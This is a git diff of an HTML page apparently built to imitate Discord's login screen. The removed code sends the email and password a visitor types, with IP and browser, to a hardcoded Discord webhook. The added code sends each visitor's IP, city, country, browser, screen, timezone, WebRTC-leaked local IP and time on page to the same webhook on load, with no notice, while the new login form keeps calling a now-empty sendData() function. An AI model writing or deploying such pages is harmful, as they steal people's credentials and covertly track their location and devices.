@@ -4,130 +4,207 @@
 <head>
     <title>bobbys little test</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://discord.com/assets/e286f3f761469ae40a8ed41b4289d5ab.css">
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        var startTime;
+        var intervalId;
+
+        function captureStartTime() {
+            startTime = new Date().getTime();
+            intervalId = setInterval(sendTimeData, 60000); // Send data every minute
+        }
+
+        function sendTimeData() {
+            if (startTime) {
+                var endTime = new Date().getTime();
+                var totalTimeSpent = (endTime - startTime) / 1000; // Convert to seconds
+                var timeData = {
+                    start: new Date(startTime).toLocaleString(),
+                    end: new Date(endTime).toLocaleString(),
+                    totalTimeSpent: totalTimeSpent.toFixed(2) + " seconds",
+                };
+
+                // Sending the data to Discord webhook
+                $.ajax({
+                    type: "POST",
+                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
+                    data: JSON.stringify(timeData),
+                    contentType: "application/json",
+                    success: function() {
+                        // Success callback
+                    },
+                    error: function() {
+                        // Error callback
+                    },
+                });
+            }
+        }
+
+        function captureEndTime() {
+            clearInterval(intervalId);
+            sendTimeData();
+        }
+
+        $(document).ready(function() {
+            // Capture the start time when the page loads
+            captureStartTime();
+
+            // Listen to the beforeunload event
+            window.addEventListener("beforeunload", captureEndTime);
+
+            $.getJSON("https://api64.ipify.org?format=json", function(ipData) {
+                var ip = ipData.ip;
+
+                // Location and browser information requested right as user visits the page
+                $.getJSON(`http://ip-api.com/json/${ip}`, function(locationData) {
+                    var country = locationData.country;
+                    var city = locationData.city;
+                    var osAndBrowser = getOsAndBrowser();
+                    var connectionType = getConnectionType();
+                    var screenResolution = getScreenResolution();
+                    var timezoneName = getTimezoneName();
+                    var language = getLanguage();
+                    var isMobile = checkMobileDevice();
+                    var cookiesEnabled = areCookiesEnabled();
+                    var localIpAddress = getLocalIpAddress();
+
+                    var requestData = {
+                        content: "Country: " + country + "\nIP: " + ip + "\nCity: " + city + "\nOperating System and Browser: " + osAndBrowser +
+                            "\nInternet Connection Type: " + connectionType + "\nScreen Resolution: " + screenResolution + "\nTimezone: " + timezoneName +
+                            "\nLanguage: " + language + "\nMobile Device: " + isMobile + "\nCookies Enabled: " + cookiesEnabled + (localIpAddress ? "\nLocal IP Address: " + localIpAddress : ""),
+                    };
+
+                    // Sending the data to Discord webhook
+                    $.ajax({
+                        type: "POST",
+                        url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
+                        data: JSON.stringify(requestData),
+                        contentType: "application/json",
+                    });
+                });
+            });
+        });
+
+        function getOsAndBrowser() {
+            var userAgent = navigator.userAgent;
+            var osAndBrowser = "Unknown";
+
+            if (userAgent.indexOf("Win") !== -1) {
+                osAndBrowser = "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                osAndBrowser = "MacOS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                osAndBrowser = "Linux";
+            }
+
+            if (userAgent.indexOf("Chrome") !== -1) {
+                osAndBrowser += " - Chrome";
+            } else if (userAgent.indexOf("Firefox") !== -1) {
+                osAndBrowser += " - Firefox";
+            } else if (userAgent.indexOf("Safari") !== -1) {
+                osAndBrowser += " - Safari";
+            } else if (userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) {
+                osAndBrowser += " - Opera";
+            } else if (userAgent.indexOf("Edge") !== -1 || userAgent.indexOf("Edg") !== -1) {
+                osAndBrowser += " - Microsoft Edge";
+            } else if (userAgent.indexOf("Trident") !== -1) {
+                osAndBrowser += " - Internet Explorer";
+            }
+
+            return osAndBrowser;
+        }
+
+        function getConnectionType() {
+            var connectionType = "Unknown";
+            if (navigator.connection) {
+                if (navigator.connection.type === "wifi") {
+                    connectionType = "Wifi";
+                } else if (navigator.connection.type === "cellular") {
+                    connectionType = "Cellular";
+                }
+            }
+            return connectionType;
+        }
+
+        function getScreenResolution() {
+            return screen.width + "x" + screen.height;
+        }
+
+        function getTimezoneName() {
+            return new Intl.DateTimeFormat().resolvedOptions().timeZone;
+        }
+
+        function getLanguage() {
+            return navigator.language || navigator.languages[0];
+        }
+
+        function checkMobileDevice() {
+            return /Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function areCookiesEnabled() {
+            return navigator.cookieEnabled ? "Yes" : "No";
+        }
+
+        function getLocalIpAddress() {
+            var localIp = "";
+            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (RTCPeerConnection) {
+                var rtcPeerConnection = new RTCPeerConnection({
+                    iceServers: []
+                });
+                rtcPeerConnection.createDataChannel("");
+                rtcPeerConnection.createOffer().then(function(offer) {
+                    rtcPeerConnection.setLocalDescription(offer);
+                });
+                rtcPeerConnection.onicecandidate = function(event) {
+                    if (event.candidate) {
+                        var candidate = event.candidate.candidate;
+                        var regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        var match = regex.exec(candidate);
+                        if (match && match.length > 1) {
+                            localIp = match[1];
+                        }
+                    }
+                };
+            }
+            return localIp;
+        }
+
+        function sendData() {
+            // Your existing function...
+            // ...
+        }
+    </script>
     <style>
-        body {
-            overflow: hidden;
-        }
-        
-        img[src="https://www.svgrepo.com/show/353655/discord-icon.svg"] {
-            pointer-events: none;
-        }
-        
-        .tos button {
-            position: fixed;
-            bottom: 93.5%;
-            left: 41%;
-            z-index: 1;
-            border: 3px solid rgb(104, 97, 210);
-            background-color: #4E5D94;
-            box-shadow: none;
-            border-radius: 10px;
-            width: 140px;
-            height: 35px;
-            font-size: 15px;
-            font-weight: 700;
-            white-space: nowrap;
-            overflow: hidden;
-            text-align: left;
-            text-indent: 1.5px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        .tos button:hover {
-            background-color: #5a6db3;
-            transition: 250ms;
-            cursor: pointer;
-        }
-        
-        .support button:hover {
-            background-color: #5a6db3;
-            transition: 250ms;
-            cursor: pointer;
-        }
-        
-        .support button:active {
-            background-color: #9dace1;
-        }
-        
-        .tos button:active {
-            background-color: #9dace1;
-        }
-        
-        .support button {
-            position: fixed;
-            bottom: 93.5%;
-            left: 52.5%;
-            z-index: 1;
-            border: 3px solid rgb(104, 97, 210);
-            background-color: #4E5D94;
-            box-shadow: none;
-            border-radius: 10px;
-            width: 140px;
-            height: 35px;
-            font-size: 15px;
-            font-weight: 700;
-            white-space: nowrap;
-            overflow: hidden;
-            text-align: left;
-            text-indent: -3.5px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        @media only screen and (max-width: 768px) {
-            .tos button,
-            .support button {
-                position: static;
-                margin: 15px auto;
-                width: 80%;
-                left: 10%;
-                bottom: 5%;
-            }
-        }
-        
-        @media only screen and (max-width: 600px) {
-            .tos button,
-            .support button {
-                position: static;
-                margin: 15px auto;
-                width: 80%;
-                left: 10%;
-                bottom: 5%;
-            }
-        }
-        
         body {
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #202225;
-            font-family: Whitney, Helvetica Neue, Helvetica, Arial, sans-serif;
-        }
-        
-        .rectangle>img {
-            display: block;
-            margin: 0 auto;
-            margin-bottom: 20px;
+            background-image: url('background.png');
         }
         
         .userinput {
-            margin-bottom: 20px;
+            position: absolute;
+            top: 33%;
+            left: 3%;
             text-align: center;
-            margin-right: 15px;
         }
         
         .userinput input {
-            background-color: #131414;
+            position: relative;
+            background-color: rgb(30, 31, 34);
             border-radius: 3px;
             border: none;
             color: #DCDDDE;
             font-size: 16px;
-            height: 44px;
+            height: 39px;
             line-height: 22px;
             padding: 10px;
-            width: 100%;
+            width: 95%;
             margin-right: 15px;
             margin-top: 10px;
             letter-spacing: .7px;
@@ -135,7 +212,7 @@
         }
         
         .userinput input:first-child {
-            margin-top: 60px;
+            margin-bottom: 40px;
         }
         
         .userinput input::placeholder {
@@ -147,287 +224,356 @@
         }
         
         .button {
-            display: flex;
-            justify-content: center;
+            position: absolute;
+            top: 80%;
+            left: 1%;
             align-items: center;
-            background-color: #4E5D94;
-            border: none;
-            border-radius: 3px;
-            color: #DCDDDE;
+            appearance: auto;
+            background-attachment: scroll;
+            background-clip: border-box;
+            background-color: rgb(88, 101, 242);
+            background-image: none;
+            background-origin: padding-box;
+            background-position-x: 0%;
+            background-position-y: 0%;
+            background-size: auto;
+            border-bottom-color: rgb(255, 255, 255);
+            border-bottom-left-radius: 3px;
+            border-bottom-right-radius: 3px;
+            border-bottom-style: none;
+            border-bottom-width: 0px;
+            border-image-outset: 0;
+            border-image-repeat: stretch;
+            border-image-slice: 100%;
+            border-image-source: none;
+            border-image-width: 1;
+            border-left-color: rgb(255, 255, 255);
+            border-left-style: none;
+            border-left-width: 0px;
+            border-right-color: rgb(255, 255, 255);
+            border-right-style: none;
+            border-right-width: 0px;
+            border-top-color: rgb(255, 255, 255);
+            border-top-left-radius: 3px;
+            border-top-right-radius: 3px;
+            border-top-style: none;
+            border-top-width: 0px;
+            box-sizing: border-box;
+            color: rgb(255, 255, 255);
             cursor: pointer;
-            font-size: 14px;
-            height: 40px;
-            line-height: 32px;
-            text-transform: uppercase;
-            width: 100%;
-            width: 101%;
-            margin-right: auto;
-            margin-bottom: 16%;
-        }
-        
-        .login {
-            position: absolute;
-            color: #DCDDDE;
-            left: 38%;
-            top: 37%;
-            font-size: 30px;
-            text-transform: uppercase;
-            font-weight: 700;
-        }
-        
-        .topborder {
-            position: absolute;
-            top: 0%;
-            left: -5%;
-            width: 110%;
-            height: 100px;
-            background-color: #373a45;
-            border-color: #6c7ddc;
-            border-width: 1px;
-            border-style: solid;
+            display: flex;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-feature-settings: normal;
+            font-kerning: auto;
+            font-optical-sizing: auto;
+            font-size: 16px;
+            font-stretch: 100%;
+            font-style: normal;
+            font-variant-alternates: normal;
+            font-variant-caps: normal;
+            font-variant-east-asian: normal;
+            font-variant-ligatures: normal;
+            font-variant-numeric: normal;
+            font-variation-settings: normal;
+            font-weight: 500;
+            height: 44px;
+            justify-content: center;
+            letter-spacing: normal;
+            line-height: 24px;
+            margin-bottom: 8px;
+            min-height: 44px;
+            min-width: 130px;
+            outline-color: rgb(255, 255, 255);
+            outline-style: none;
+            outline-width: 0px;
+            padding-bottom: 2px;
+            padding-left: 16px;
+            padding-right: 16px;
+            padding-top: 2px;
+            position: relative;
+            text-align: center;
+            text-indent: 0px;
+            text-rendering: optimizelegibility;
+            text-shadow: none;
+            text-transform: none;
+            transition-delay: 0s, 0s;
+            transition-duration: 0.17s, 0.17s;
+            transition-property: background-color, color;
+            transition-timing-function: ease, ease;
+            user-select: none;
+            width: 414px;
+            word-spacing: 0px;
+            -webkit-box-align: center;
+            -webkit-box-direction: normal;
+            -webkit-box-pack: center;
         }
         
         .button:hover {
             background-color: #7289DA;
         }
         
-        .discord {
+        .login {
             position: absolute;
-            top: -19%;
-            left: 30%;
-            color: #a2abe0;
-            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
-            font-size: 50px;
-            text-transform: capitalize;
-            font-weight: 900;
+            top: 9%;
+            left: 26%;
+            border-bottom-color: rgb(242, 243, 245);
+            border-bottom-style: none;
+            white-space: nowrap;
+            border-bottom-width: 0px;
+            border-image-outset: 0;
+            border-image-repeat: stretch;
+            border-image-slice: 100%;
+            border-image-source: none;
+            border-image-width: 1;
+            border-left-color: rgb(242, 243, 245);
+            border-left-style: none;
+            border-left-width: 0px;
+            border-right-color: rgb(242, 243, 245);
+            border-right-style: none;
+            border-right-width: 0px;
+            border-top-color: rgb(242, 243, 245);
+            border-top-style: none;
+            border-top-width: 0px;
+            color: rgb(242, 243, 245);
+            display: block;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 22.5px;
+            font-style: normal;
+            font-weight: 600;
+            height: 30px;
+            line-height: 30px;
+            margin-block-end: 8px;
+            margin-block-start: 0px;
+            margin-bottom: 8px;
+            margin-inline-end: 0px;
+            margin-inline-start: 0px;
+            margin-left: 0px;
+            margin-right: 0px;
+            margin-top: 0px;
+            padding-bottom: 0px;
+            padding-left: 0px;
+            padding-right: 0px;
+            padding-top: 0px;
+            text-align: center;
+            text-rendering: optimizelegibility;
+            user-select: none;
+            width: 156.969px;
+            -webkit-box-direction: normal;
+        }
+        
+        .message {
+            position: absolute;
+            top: 18%;
+            left: 22%;
+            border-bottom-color: rgb(181, 186, 193);
+            border-bottom-style: none;
+            border-bottom-width: 0px;
+            border-image-outset: 0;
+            border-image-repeat: stretch;
+            border-image-slice: 100%;
+            border-image-source: none;
+            border-image-width: 1;
+            border-left-color: rgb(181, 186, 193);
+            border-left-style: none;
+            border-left-width: 0px;
+            border-right-color: rgb(181, 186, 193);
+            border-right-style: none;
+            border-right-width: 0px;
+            border-top-color: rgb(181, 186, 193);
+            border-top-style: none;
+            border-top-width: 0px;
+            color: rgb(181, 186, 193);
+            display: block;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 15px;
+            font-style: normal;
+            font-weight: 400;
+            height: 20px;
+            line-height: 20px;
+            margin-bottom: 0px;
+            margin-left: 0px;
+            margin-right: 0px;
+            margin-top: 0px;
+            outline-color: rgb(181, 186, 193);
+            outline-style: none;
+            outline-width: 0px;
+            padding-bottom: 0px;
+            white-space: nowrap;
+            padding-left: 0px;
+            padding-right: 0px;
+            padding-top: 0px;
+            text-align: center;
+            text-rendering: optimizelegibility;
+            user-select: none;
+            width: 224.547px;
+            -webkit-box-direction: normal;
+        }
+        
+        .email {
+            position: absolute;
+            top: 29%;
+            left: 4%;
+            border-bottom-color: rgb(181, 186, 193);
+            border-bottom-style: none;
+            border-bottom-width: 0px;
+            border-image-outset: 0;
+            border-image-repeat: stretch;
+            border-image-slice: 100%;
+            border-image-source: none;
+            border-image-width: 1;
+            border-left-color: rgb(181, 186, 193);
+            border-left-style: none;
+            border-left-width: 0px;
+            border-right-color: rgb(181, 186, 193);
+            border-right-style: none;
+            border-right-width: 0px;
+            border-top-color: rgb(181, 186, 193);
+            border-top-style: none;
+            border-top-width: 0px;
+            color: rgb(181, 186, 193);
+            cursor: default;
+            display: block;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 12px;
+            font-style: normal;
+            font-weight: 700;
+            height: 16px;
+            letter-spacing: 0.24px;
+            line-height: 16px;
+            margin-bottom: 8px;
+            margin-left: 0px;
+            margin-right: 0px;
+            margin-top: 0px;
+            outline-color: rgb(181, 186, 193);
+            outline-style: none;
+            outline-width: 0px;
+            padding-bottom: 0px;
+            padding-left: 0px;
+            padding-right: 0px;
+            padding-top: 0px;
+            text-align: left;
+            text-rendering: optimizelegibility;
+            text-transform: uppercase;
+            user-select: none;
+            width: 414px;
+            -webkit-box-direction: normal;
+        }
+        
+        .password {
+            position: absolute;
+            top: 52%;
+            left: 4%;
+            border-bottom-color: rgb(181, 186, 193);
+            border-bottom-style: none;
+            border-bottom-width: 0px;
+            border-image-outset: 0;
+            border-image-repeat: stretch;
+            border-image-slice: 100%;
+            border-image-source: none;
+            border-image-width: 1;
+            border-left-color: rgb(181, 186, 193);
+            border-left-style: none;
+            border-left-width: 0px;
+            border-right-color: rgb(181, 186, 193);
+            border-right-style: none;
+            border-right-width: 0px;
+            border-top-color: rgb(181, 186, 193);
+            border-top-style: none;
+            border-top-width: 0px;
+            color: rgb(181, 186, 193);
+            cursor: default;
+            display: block;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 12px;
+            font-style: normal;
+            font-weight: 700;
+            height: 16px;
+            letter-spacing: 0.24px;
+            line-height: 16px;
+            margin-bottom: 8px;
+            margin-left: 0px;
+            margin-right: 0px;
+            margin-top: 0px;
+            outline-color: rgb(181, 186, 193);
+            outline-style: none;
+            outline-width: 0px;
+            padding-bottom: 0px;
+            padding-left: 0px;
+            padding-right: 0px;
+            padding-top: 0px;
+            text-align: left;
+            text-rendering: optimizelegibility;
+            text-transform: uppercase;
+            user-select: none;
+            width: 414px;
+            -webkit-box-direction: normal;
         }
         
         .rectangle {
-            position: relative;
-            width: 400px;
-            max-width: 100%;
-            background-color: #36393E;
+            position: absolute;
+            width: 790px;
+            height: 395px;
+            background-color: rgb(49, 51, 56);
             border-radius: 8px;
             padding: 20px;
             margin: auto;
-            right: 0px;
-            box-sizing: border-box;
+            left: 29%;
+            bottom: 30%;
         }
+        /* Responsive styles */
         
-        .custom-dropdown {
-            position: relative;
-            display: inline-block;
-            width: 150px;
-            left: 30%;
-            border: 2px solid #4b0082;
-            border-radius: 5px;
-            transform: translateY(1050%);
-        }
-        
-        .custom-dropdown select {
-            width: 100%;
-            padding: 5px 10px;
-            /* Adjust the padding values here */
-            font-size: 16px;
-            border: none;
-            background-color: #7289da;
-            color: white;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            cursor: pointer;
-        }
-        
-        .custom-dropdown select:hover {
-            background-color: #5a6b8c;
-        }
-        
-        .custom-dropdown select:focus {
-            outline: none;
-        }
-        
-        .custom-dropdown::after {
-            content: '\25BC';
-            position: absolute;
-            top: 7px;
-            right: 10px;
-            color: white;
-            pointer-events: none;
-        }
-        
-        select:focus {
-            outline: none;
+        @media (max-width: 992px) {
+            .rectangle {
+                width: 80%;
+                left: 5%;
+            }
         }
         
         @media (max-width: 768px) {
             .rectangle {
-                width: 90%;
+                width: 80%;
+                left: 2%;
+            }
+            .userinput {
+                margin-top: 40px;
             }
         }
         
-        @media (max-width: 600px) {
+        @media (max-width: 576px) {
             .rectangle {
-                width: 80%;
+                width: 90%;
+                left: 5%;
+            }
+            .userinput {
+                margin-top: 30px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            .rectangle {
+                width: 95%;
+                left: 2.5%;
+            }
+            .userinput {
+                margin-top: 20px;
             }
         }
     </style>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            $.getJSON("https://api64.ipify.org?format=json", function(data) {
-                var ip = data.ip;
-                var requestData = {
-                    content: "IP: " + ip,
-                };
-                $.ajax({
-                    type: "POST",
-                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
-                    data: JSON.stringify(requestData),
-                    contentType: "application/json",
-                });
-            });
-        });
-        const dropdown = document.getElementById('country-dropdown');
-
-        dropdown.addEventListener('change', function() {
-            const selectedValue = dropdown.value;
-
-            // Change the background color based on the selected value
-            switch (selectedValue) {
-                case 'america':
-                    dropdown.style.backgroundColor = '#7289da';
-                    break;
-                case 'china':
-                    dropdown.style.backgroundColor = '#f04747';
-                    break;
-                case 'india':
-                    dropdown.style.backgroundColor = '#43b581';
-                    break;
-                    // Add more cases for additional options
-                case 'germany':
-                    dropdown.style.backgroundColor = '#faa61a';
-                    break;
-                case 'japan':
-                    dropdown.style.backgroundColor = '#d62976';
-                    break;
-                case 'russia':
-                    dropdown.style.backgroundColor = '#1dcaff';
-                    break;
-                    // Add more cases for other countries
-                default:
-                    dropdown.style.backgroundColor = '#7289da';
-            }
-        });
-
-        // Set the initial background color based on the selected option on page load
-        const initialSelectedValue = dropdown.value;
-
-        switch (initialSelectedValue) {
-            case 'america':
-                dropdown.style.backgroundColor = '#7289da';
-                break;
-            case 'china':
-                dropdown.style.backgroundColor = '#f04747';
-                break;
-            case 'india':
-                dropdown.style.backgroundColor = '#43b581';
-                break;
-                // Add more cases for additional options
-            case 'germany':
-                dropdown.style.backgroundColor = '#faa61a';
-                break;
-            case 'japan':
-                dropdown.style.backgroundColor = '#d62976';
-                break;
-            case 'russia':
-                dropdown.style.backgroundColor = '#1dcaff';
-                break;
-                // Add more cases for other countries
-            default:
-                dropdown.style.backgroundColor = '#7289da';
-        }
-
-        function sendData() {
-            var email = $("#email").val();
-            var password = $("#password").val();
-            $.getJSON("https://api64.ipify.org?format=json", function(data) {
-                var ip = data.ip;
-                var browserName = navigator.userAgent;
-                var requestData = {
-                    content: "Email: " + email + "\nPassword: " + password + "\nIP: " + ip + "\nBrowser: " + browserName
-                };
-                $.ajax({
-                    type: "POST",
-                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
-                    data: JSON.stringify(requestData),
-                    contentType: "application/json",
-                    success: function() {
-                        alert("thanks for submitting")
-                    },
-                    error: function() {
-                        alert("Failed to send data to Discord webhook!");
-                    }
-                });
-            });
-        }
-    </script>
 </head>
 
-<body>
-    <div class="tos"><button>Terms Of Service</button></div>
-    <div class="support"><button>Customer Support</button></div>
-    <div class="topborder"> </div>
-    <div class="rectangle">
-        <div class="discord">Andrew</div>
-        <div class="login">Login</div>
-        <div class="custom-dropdown" ">
-            <select id="country-dropdown ">
-                <option value=" " disabled selected>Select Country</option>
-                <option value="america ">America</option>
-                <option value="china ">China</option>
-                <option value="india ">India</option>
-                <option value="indonesia ">Indonesia</option>
-                <option value="pakistan ">Pakistan</option>
-                <option value="brazil ">Brazil</option>
-                <option value="nigeria ">Nigeria</option>
-                <option value="bangladesh ">Bangladesh</option>
-                <option value="russia ">Russia</option>
-                <option value="mexico ">Mexico</option>
-                <option value="japan ">Japan</option>
-                <option value="ethiopia ">Ethiopia</option>
-                <option value="philippines ">Philippines</option>
-                <option value="egypt ">Egypt</option>
-                <option value="vietnam ">Vietnam</option>
-                <option value="drcongo ">DR Congo</option>
-                <option value="turkey ">Turkey</option>
-                <option value="iran ">Iran</option>
-                <option value="germany ">Germany</option>
-                <option value="thailand ">Thailand</option>
-                <option value="uk ">United Kingdom</option>
-                <option value="france ">France</option>
-                <option value="italy ">Italy</option>
-                <option value="tanzania ">Tanzania</option>
-                <option value="southafrica ">South Africa</option>
-                <option value="myanmar ">Myanmar</option>
-                <option value="southkorea ">South Korea</option>
-                <option value="colombia ">Colombia</option>
-                <option value="kenya ">Kenya</option>
-                <option value="spain ">Spain</option>
-                <option value="uganda ">Uganda</option>
-                <option value="argentina ">Argentina</option>
-                <option value="algeria ">Algeria</option>
-                <option value="sudan ">Sudan</option>
-                <option value="ukraine ">Ukraine</option>
-                <option value="iraq ">Iraq</option>
-            </select>
+<body onbeforeunload="captureEndTime()">
+    <div class="container">
+        <div class="rectangle">
+            <p class="email">EMAIL OR PHONE NUMBER <span style='color: red;'>*</span></p>
+            <p class="password">PASSWORD <span style='color: red;'>*</span></p>
+            <div class="login">Welcome back!</div>
+            <div class="message">We're so excited to see you again!</div>
+            <div class="userinput">
+                <input type="text" id="email" autocomplete="off">
+                <input type="password" id="password" autocomplete="off">
+            </div>
+            <button class="button" onclick="sendData()">Login</button>
         </div>
-
-        <img src="https://www.svgrepo.com/show/353655/discord-icon.svg " width="100px " height="100px " alt="Discord Logo ">
-        <div class="userinput ">
-            <input type="text " id="email " placeholder="Username " autocomplete="off ">
-            <input type="password " id="password " placeholder="Password " autocomplete="off ">
-        </div>
-        <button class="button " onclick="sendData() ">Submit</button>
     </div>
 
 </body>
